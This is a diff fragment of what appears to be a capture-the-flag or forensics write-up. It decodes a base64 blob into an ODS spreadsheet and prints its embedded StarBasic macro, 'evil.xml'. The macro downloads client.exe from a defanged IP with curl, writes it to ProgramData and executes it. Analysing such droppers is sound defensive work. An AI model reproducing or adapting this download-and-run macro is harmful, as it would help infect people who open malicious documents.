@@ -11,6 +11,14 @@ cat sheet.txt | base64 -d > sheet.ods
 ```
 ```
 unzip sheet.ods
+cat Basic/Standard/evil.xml 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evil" script:language="StarBasic" script:moduleType="normal">Sub Main
+
+    Shell(&quot;cmd /c curl 10[.]13[.]44[.]207/client.exe -o C:\ProgramData\client.exe&quot;)
+    Shell(&quot;cmd /c echo VEhN******F5Xw==&quot;)
+    Shell(&quot;C:\\ProgramData\\client.exe&quot;)
 ```
 
 convert text to hex:
